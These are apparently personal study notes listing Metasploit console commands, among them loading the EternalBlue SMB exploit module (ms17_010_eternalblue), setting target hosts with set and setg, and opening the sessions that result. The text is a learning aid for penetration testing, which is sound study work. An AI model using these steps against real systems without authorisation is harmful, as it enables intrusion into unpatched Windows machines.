msfconsole
ls 
ping -c 5 8.8.8.8
clear
history
back
`use exploit/windows/smb/ms17_010_eternalblue`
show options
show payloads
info
search ms17-010
search type:auxiliary ms17-010
set rhosts [remote_ip]
unset all - remove previously set rhost
You can use the `setg` command to set values that will be used for all modules. The `setg` command is used like the set command. The difference is that if you use the `set` command to set a value using a module and you switch to another module, you will need to set the value again. The `setg` command allows you to set the value so it can be used by default across different modules. You can clear any value set with `setg` using `unsetg`.
setg rhost [remote_ip]
unsetg all
After setting up rhosts, lport, etc. Run sessions
sessions -i 1 or 2 (whichever session we want to use)
